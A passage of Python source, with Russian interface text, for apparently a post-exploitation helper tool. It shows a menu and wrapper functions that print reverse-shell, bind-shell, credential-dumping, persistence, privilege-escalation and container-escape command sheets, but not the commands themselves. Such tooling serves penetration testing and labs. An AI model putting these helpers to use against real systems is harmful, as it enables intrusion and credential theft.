                        lines.append(cmd)
                    lines.append("```")
                    lines.append("")
            Path(out_path).write_text("\n".join(lines), encoding="utf-8")

        console.print(f"[green]✓ Экспорт: {out_path}[/green]")
        db.save_scan("pivot_export", category,
                     {"path": str(out_path), "format": fmt})
        return Path(out_path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка экспорта: {exc}[/red]")
        return None


# ===========================================================================
# Меню
# ===========================================================================

def menu() -> None:
    table = Table(title="[bold]🔀 Pivot / Post-Exploitation Helpers Pro[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Reverse shell one-liners (40+)"),
        ("2", "Bind shell one-liners (10+)"),
        ("3", "TTY / Shell stabilization"),
        ("4", "File transfer techniques"),
        ("5", "Pivoting (SSH, socat, chisel, ligolo, …)"),
        ("6", "Linux privesc (60+ checks)"),
        ("7", "Windows privesc (40+ checks)"),
        ("8", "Container escape one-liners"),
        ("9", "Cloud metadata one-liners"),
        ("10", "Credential dumping one-liners"),
        ("11", "Persistence one-liners"),
        ("12", "Payload encoding"),
        ("13", "🔍 Поиск по всем категориям"),
        ("14", "🔧 Проверить локальные инструменты"),
        ("15", "📄 Экспорт cheat-sheet (md/txt/json/sh)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    console.print("[yellow]⚠ Только для этичного использования и CTF / лабораторий.[/yellow]")
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])

    if c == "1":
        cli_reverse_shells()
    elif c == "2":
        cli_bind_shells()
    elif c == "3":
        cli_tty_upgrade()
    elif c == "4":
        cli_file_transfer()
    elif c == "5":
        cli_pivot()
    elif c == "6":
        cli_linux_privesc()
    elif c == "7":
        cli_windows_privesc()
    elif c == "8":
        cli_container_escape()
    elif c == "9":
        cli_cloud_metadata()
    elif c == "10":
        cli_cred_dump()
    elif c == "11":
        cli_persistence()
    elif c == "12":
        cli_payload_encoding()
    elif c == "13":
        q = Prompt.ask("Поиск (например 'reverse', 'ssh', 'chisel')")
        show_search(q)
    elif c == "14":
        show_tools()
    elif c == "15":
        cat = Prompt.ask("Категория",
                         choices=["all"] + list(ALL_CATEGORIES.keys()),
                         default="all")
        lh = Prompt.ask("LHOST (опц.)", default="").strip()
        lp = Prompt.ask("LPORT", default="4444")
        tgt = Prompt.ask("TARGET_IP (опц.)", default="").strip()
        fmt = Prompt.ask("Формат", choices=["md", "txt", "json", "sh"],
                          default="md")
        export_to_file(cat, lhost=lh, lport=lp, target_ip=tgt, fmt=fmt)


# ===========================================================================
# CLI-функции (сохранены все старые + новые)
# ===========================================================================

def cli_reverse_shells(lhost: str | None = None,
                       lport: str | None = None) -> None:
    if not lhost:
        lhost = Prompt.ask("LHOST (твой IP)", default="10.0.0.1")
    if not lport:
        lport = Prompt.ask("LPORT", default="4444")

    console.print(f"\n[bold cyan]💀 Reverse shells → {lhost}:{lport}[/bold cyan]\n")
    _print_dict_commands(REVERSE_SHELLS, "Reverse shells", lhost, lport)
    db.save_scan("pivot", "revshell", {"lhost": lhost, "lport": lport})


def cli_bind_shells(lport: str | None = None) -> None:
    if not lport:
        lport = Prompt.ask("LPORT (на цели)", default="4444")
    console.print(f"\n[bold cyan]🎯 Bind shells на порту {lport}[/bold cyan]\n")
    _print_dict_commands(BIND_SHELLS, "Bind shells", lport=lport)


def cli_tty_upgrade(lhost: str | None = None,
                    lport: str | None = None) -> None:
    lhost = lhost or Prompt.ask("LHOST", default="10.0.0.1")
    lport = lport or Prompt.ask("LPORT", default="4444")
    console.print("\n[bold cyan]🖥  TTY / Shell stabilization[/bold cyan]\n")
    _print_dict_commands(TTY_UPGRADE, "TTY", lhost, lport)


def cli_file_transfer(lhost: str | None = None,
                      target_ip: str | None = None) -> None:
    lhost = lhost or Prompt.ask("LHOST (твой IP)", default="10.0.0.1")
    target_ip = target_ip or Prompt.ask("TARGET_IP (цель, если нужно)",
                                        default="")
    console.print("\n[bold cyan]📁 File transfer[/bold cyan]\n")
    _print_dict_commands(FILE_TRANSFER, "File transfer",
                         lhost, target_ip=target_ip)


def cli_pivot(lhost: str | None = None, lport: str | None = None,
              target_ip: str | None = None) -> None:
    lhost = lhost or Prompt.ask("LHOST", default="10.0.0.1")
    lport = lport or Prompt.ask("LPORT", default="4444")
    target_ip = target_ip or Prompt.ask("TARGET_IP", default="10.0.0.5")
    console.print("\n[bold cyan]🔀 Pivoting[/bold cyan]\n")
    _print_dict_commands(PIVOTING, "Pivoting", lhost, lport, target_ip)


def cli_linux_privesc(target_ip: str | None = None) -> None:
    target_ip = target_ip or Prompt.ask("TARGET_IP (если нужно)",
                                        default="10.0.0.5")
    console.print("\n[bold cyan]🐧 Linux privesc[/bold cyan]\n")
    _print_dict_commands(LINUX_PRIVESC, "Linux privesc",
                         target_ip=target_ip)


def cli_windows_privesc(lhost: str | None = None) -> None:
    lhost = lhost or Prompt.ask("LHOST (для загрузки WinPEAS)",
                                default="10.0.0.1")
    console.print("\n[bold cyan]🪟 Windows privesc[/bold cyan]\n")
    _print_dict_commands(WINDOWS_PRIVESC, "Windows privesc", lhost=lhost)


def cli_payload_encoding() -> None:
    console.print("\n[bold cyan]🔐 Payload encoding[/bold cyan]\n")
    _print_dict_commands(PAYLOAD_ENCODING, "Payload encoding")


def cli_container_escape() -> None:
    console.print("\n[bold cyan]🔓 Container escape one-liners[/bold cyan]\n")
    _print_dict_commands(CONTAINER_ESCAPE, "Container escape",
                         lhost="LHOST", lport="LPORT")


def cli_cloud_metadata() -> None:
    console.print("\n[bold cyan]☁  Cloud metadata one-liners[/bold cyan]\n")
    _print_dict_commands(CLOUD_METADATA, "Cloud metadata")


def cli_cred_dump() -> None:
    console.print("\n[bold cyan]🔑 Credential dumping[/bold cyan]\n")
    _print_dict_commands(CRED_DUMP, "Credential dumping")


def cli_persistence() -> None:
    console.print("\n[bold cyan]🔁 Persistence one-liners[/bold cyan]\n")
    _print_dict_commands(PERSISTENCE, "Persistence")


def cli_search(query: str) -> None:
    show_search(query)


def cli_tools() -> None:
    show_tools()


def cli_export(category: str = "all", fmt: str = "md",
               lhost: str = "", lport: str = "4444",
               target_ip: str = "", out_path: str | None = None) -> None:
    export_to_file(category, lhost=lhost, lport=lport,
                   target_ip=target_ip, fmt=fmt, out_path=out_path)


# Быстрые функции (без аргументов) для TUI
def quick_reverse() -> None:
    _print_dict_commands(REVERSE_SHELLS, "Reverse shells",
                         "LHOST", "4444")


def quick_bind() -> None:
    _print_dict_commands(BIND_SHELLS, "Bind shells", lport="4444")


def quick_tty() -> None:
    _print_dict_commands(TTY_UPGRADE, "TTY", "LHOST", "4444")


def quick_transfer() -> None:
    _print_dict_commands(FILE_TRANSFER, "File transfer", "LHOST")


def quick_pivot() -> None:
    _print_dict_commands(PIVOTING, "Pivoting", "LHOST", "4444", "TARGET")


def quick_linux_privesc() -> None:
    _print_dict_commands(LINUX_PRIVESC, "Linux privesc")


def quick_windows_privesc() -> None:
    _print_dict_commands(WINDOWS_PRIVESC, "Windows privesc", lhost="LHOST")


def quick_encoding() -> None:
    _print_dict_commands(PAYLOAD_ENCODING, "Payload encoding")


def quick_container_escape() -> None:
    _print_dict_commands(CONTAINER_ESCAPE, "Container escape")


def quick_cloud_metadata() -> None:
    _print_dict_commands(CLOUD_METADATA, "Cloud metadata")


def quick_cred_dump() -> None:
    _print_dict_commands(CRED_DUMP, "Credential dumping")


def quick_persistence() -> None:
    _print_dict_commands(PERSISTENCE, "Persistence")